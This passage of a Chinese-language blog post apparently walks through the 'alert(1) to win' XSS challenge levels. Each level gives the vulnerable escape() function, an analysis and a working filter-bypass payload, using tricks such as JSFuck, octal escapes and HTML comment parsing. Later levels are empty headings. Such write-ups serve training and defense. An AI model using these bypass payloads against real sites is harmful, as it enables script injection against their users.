-<h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>代码首先将输入的字符串按照<code>#</code>分割为两部分，第一部分是回调函数，只能使用大小写字母、<code>[</code>、<code>]</code>、<code>&#39;</code>，第二部分是<code>JSON</code>数据。<br>而且后面又将<code>JSON</code>数据中的尖括号转义成了<code>\\u003c</code>。<br>最终的目的依旧是执行<code>JS</code>代码，<code>thing[0]</code>部分不一定是一个函数，只要满足要求就OK。<br>既然回调函数名部分和后面的值都没有过滤单引号，可以在前后放两个单引号，从而闭合它们之间的值。再加个分号作为分割，后面就好操作了。</p>
-<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>闭合<code>&lt;script&gt;</code>标签，但是方法<code>alert(1)</code>，被转换成大写了，无法执行，尝试编码绕过。</p>
-<h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&lt;img src onerror&#x3D;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function htmlEscape(s) &#123;</span><br><span class="line">    return s.replace(&#x2F;.&#x2F;g, function(x) &#123;</span><br><span class="line">       return &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &quot;&#39;&quot;: &#39;&#39;&#39; &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function expandTemplate(template, args) &#123;</span><br><span class="line">    return template.replace(</span><br><span class="line">        &#x2F;&#123;(\w+)&#125;&#x2F;g, </span><br><span class="line">        function(_, n) &#123; </span><br><span class="line">           return htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  return expandTemplate(</span><br><span class="line">    &quot;                                                \n\</span><br><span class="line">      &lt;h2&gt;Hello, &lt;span id&#x3D;name&gt;&lt;&#x2F;span&gt;!&lt;&#x2F;h2&gt;         \n\</span><br><span class="line">      &lt;script&gt;                                       \n\</span><br><span class="line">         var v &#x3D; document.getElementById(&#39;name&#39;);    \n\</span><br><span class="line">         v.innerHTML &#x3D; &#39;&lt;a href&#x3D;#&gt;&#123;name&#125;&lt;&#x2F;a&gt;&#39;;       \n\</span><br><span class="line">      &lt;\&#x2F;script&gt;                                     \n\</span><br><span class="line">    &quot;,</span><br><span class="line">    &#123; name : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>代码对输入的<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>、进行了转义，输入的字符串会拼接在<code>{name}</code>处。<br>由于没有过滤<code>\</code>，可以利用<code>JS</code>的8进制或者16进制编码来绕过。</p>
-<h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32个字符</span><br><span class="line">\x3cimg src onerror&#x3D;alert(1)\x3e</span><br><span class="line">26个字符</span><br><span class="line">\x3cstyle&#x2F;onload&#x3D;alert(1)  &#x2F;&#x2F;末尾有一个空格</span><br></pre></td></tr></table></figure>
-
-<h2 id="JSON-2"><a href="#JSON-2" class="headerlink" title="JSON 2"></a>JSON 2</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s &#x3D; JSON.stringify(s).replace(&#x2F;&lt;\&#x2F;script&#x2F;gi, &#39;&#39;);</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&#39; + s + &#39;);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>对<code>&lt;/script</code>标签进行了过滤，由于正则中存在<code>i</code>修饰符，不区分大小写，不能使用大小写混合来绕过。</p>
-<p>由于直接将字符串替换为空，可以双写绕过。</p>
-<h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;s&lt;&#x2F;scriptcript&gt;&lt;script&gt;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Callback-2"><a href="#Callback-2" class="headerlink" title="Callback 2"></a>Callback 2</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  &#x2F;&#x2F; Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing &#x3D; s.split(&#x2F;#&#x2F;); </span><br><span class="line"></span><br><span class="line">  if (!&#x2F;^[a-zA-Z\[\]&#39;]*$&#x2F;.test(thing[0])) return &#39;Invalid callback&#39;;</span><br><span class="line">  var obj &#x3D; &#123;&#39;userdata&#39;: thing[1] &#125;;</span><br><span class="line">  var json &#x3D; JSON.stringify(obj).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>与第6题的类似，但是转义了<code>/</code>，导致<code>//</code>这个注释符无法使用，但是<code>JavaScript</code>的注释符有三种，分别是<code>//</code>、<code>/**/</code>、<code>&lt;!--</code><br>可以使用来注释。</p>
-<h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;#&#39;;alert(1)&lt;!--</span><br></pre></td></tr></table></figure>
-
-<h2 id="Skandia-2"><a href="#Skandia-2" class="headerlink" title="Skandia 2"></a>Skandia 2</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>代码过滤了<code>&lt;</code>、<code>&gt;</code>。还将所有输入的字母变成了大写，不能借助<code>toUpperCase()</code>的特性来解了。<br>可以利用<code>jsfuck</code>。直接将<code>&quot;);alert(1)//</code>中的<code>alert(1)</code>用<code>jsfuck</code>表示。</p>
-<p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">JSfuck</a></p>
-<p>但是直接使用工具生成的<code>jsfuck</code>太长了，不过我们还有另一种方法，就是<code>JS</code>的匿名函数。</p>
-<p>我们可以通过这种方法来执行任意方法。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][&#39;map&#39;][&#39;constructor&#39;](&#39;alert(1)&#39;)()</span><br></pre></td></tr></table></figure>
-
-<p>由于对字母进行了大写转换，我们可以将其进行8进制编码，然后闭合前面，注释后面。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一</span><br><span class="line">&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()&#x2F;&#x2F;</span><br><span class="line">方法二</span><br><span class="line">&quot;);[][&#39;\155\141\160&#39;][&#39;\143\157\156\163\164\162\165\143\164\157\162&#39;](&#39;\141\154\145\162\164(1)&#39;)()&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var tag &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; https:&#x2F;&#x2F;4i.am&#x2F;?...raw&#x3D;... just outputs whatever you pass in.</span><br><span class="line">  &#x2F;&#x2F;</span><br><span class="line">  &#x2F;&#x2F; Alerting from 4i.am won&#39;t count.</span><br><span class="line"></span><br><span class="line">  s &#x3D; &#39;&lt;script&gt;&#39; + s + &#39;&lt;\&#x2F;script&gt;&#39;;</span><br><span class="line">  tag.src &#x3D; &#39;https:&#x2F;&#x2F;4i.am&#x2F;?:XSS&#x3D;0&amp;CT&#x3D;text&#x2F;html&amp;raw&#x3D;&#39; + encodeURIComponent(s);</span><br><span class="line"></span><br><span class="line">  window.WINNING &#x3D; function() &#123; youWon &#x3D; true; &#125;;</span><br><span class="line"></span><br><span class="line">  tag.setAttribute(&#39;onload&#39;, &#39;youWon &amp;&amp; alert(1)&#39;);</span><br><span class="line">  return tag.outerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>只要使<code>youWon</code>为<code>true</code>，这样就能执行<code>alert(1)</code>了。<br>解决思路是利用到<code>iframe</code>的特性，当在<code>iframe</code>中设置了一个<code>name</code>属性之后， 这个<code>name</code>属性的值就会变成<code>iframe</code>中的<code>window</code>对象的全局。</p>
-<h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&quot;youWon&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="TI-S-M"><a href="#TI-S-M" class="headerlink" title="TI(S)M"></a>TI(S)M</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  function json(s) &#123; return JSON.stringify(s).replace(&#x2F;\&#x2F;&#x2F;g, &#39;\\&#x2F;&#39;); &#125;</span><br><span class="line">  function html(s) &#123; return s.replace(&#x2F;[&lt;&gt;&quot;&amp;]&#x2F;g, function(s) &#123;</span><br><span class="line">                        return &#39;&amp;#&#39; + s.charCodeAt(0) + &#39;;&#39;; &#125;); &#125;</span><br><span class="line"></span><br><span class="line">  return (</span><br><span class="line">    &#39;&lt;script&gt;&#39; +</span><br><span class="line">      &#39;var url &#x3D; &#39; + json(s) + &#39;; &#x2F;&#x2F; We\&#39;ll use this later &#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;\n\n&#39; +</span><br><span class="line">    &#39;  &lt;!-- for debugging --&gt;\n&#39; +</span><br><span class="line">    &#39;  URL: &#39; + html(s) + &#39;\n\n&#39; +</span><br><span class="line">    &#39;&lt;!-- then suddenly --&gt;\n&#39; +</span><br><span class="line">    &#39;&lt;script&gt;\n&#39; +</span><br><span class="line">    &#39;  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);\n&#39; +</span><br><span class="line">    &#39;  else new Image().src &#x3D; url;\n&#39; +</span><br><span class="line">    &#39;&lt;&#x2F;script&gt;&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>本题用到了一个小<code>trick</code>:<br><code>HTML5</code>解析器会将<code>&lt;!--&lt;script&gt;</code>到<code>&lt;/script&gt;</code>之间的任何东西都当作<code>JavaScript</code>代码处理，同时要确保代码中还有一个<code>--&gt;</code>来防止解析器报语法错误。</p>
-<p>首先输入一个<code>&lt;!--&lt;script&gt;</code>，此时的输出中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这一段所有的代码都会当做<code>JS</code>执行。<br>在后面有个正则表达式<code>!/^http:.*/</code>，其中的<code>*/</code>可以当做注释，那么我们在前面再加入一个<code>/*</code>即可闭合。<br>此时的输出为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var url &#x3D; &quot;\&#x2F;*&lt;!--&lt;script&gt;&quot;; &#x2F;&#x2F; We&#39;ll use this later &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- for debugging --&gt;</span><br><span class="line">  URL: &#x2F;*&amp;#60;!--&amp;#60;script&amp;#62;</span><br><span class="line"></span><br><span class="line">&lt;!-- then suddenly --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  if (!&#x2F;^http:.*&#x2F;.test(url)) console.log(&quot;Bad url: &quot; + url);</span><br><span class="line">  else new Image().src &#x3D; url;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在注释符之前添加要执行的代码就可以了。</p>
-<h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(alert(1)&#x2F;*&lt;!--&lt;script&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="JSON-3"><a href="#JSON-3" class="headerlink" title="JSON 3"></a>JSON 3</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">    return s.split(&#39;#&#39;).map(function(v) &#123;</span><br><span class="line">        &#x2F;&#x2F; Only 20% of slashes are end tags; save 1.2% of total</span><br><span class="line">        &#x2F;&#x2F; bytes by only escaping those.</span><br><span class="line">        var json &#x3D; JSON.stringify(v).replace(&#x2F;&lt;\&#x2F;&#x2F;g, &#39;&lt;\\&#x2F;&#39;);</span><br><span class="line">        return &#39;&lt;script&gt;console.log(&#39; + json + &#39;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">    &#125;).join(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>题目思路与上一个题类似，借助<code>&lt;!--&lt;script&gt;</code>来执行JS代码，不过因为后面没有<code>--&gt;</code>，解析器会报错，需要我们在后面构造一个<code>--&gt;</code>来避免报错。</p>
-<p>构造的<code>Payload</code>为``，此时输出为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;&#x2F;script&gt;&lt;script&gt;console.log(&quot;)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>/script&gt;console.log(&quot;)/</code>被当做了正则表达式解析，后面通过分号分割后，成功执行代码<code>alert(1)</code>。</p>
-<h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--&lt;script&gt;#)&#x2F;;alert(1)&#x2F;&#x2F;--&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Skandia-3"><a href="#Skandia-3" class="headerlink" title="Skandia 3"></a>Skandia 3</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (&#x2F;[\\&lt;&gt;]&#x2F;.test(s)) return &#39;-&#39;;</span><br><span class="line"></span><br><span class="line">  return &#39;&lt;script&gt;console.log(&quot;&#39; + s.toUpperCase() + &#39;&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-14"><a href="#payload-14" class="headerlink" title="payload"></a>payload</h3><h2 id="RFC4627"><a href="#RFC4627" class="headerlink" title="RFC4627"></a>RFC4627</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
       <categories>
         <category>WEB</category>
       </categories>
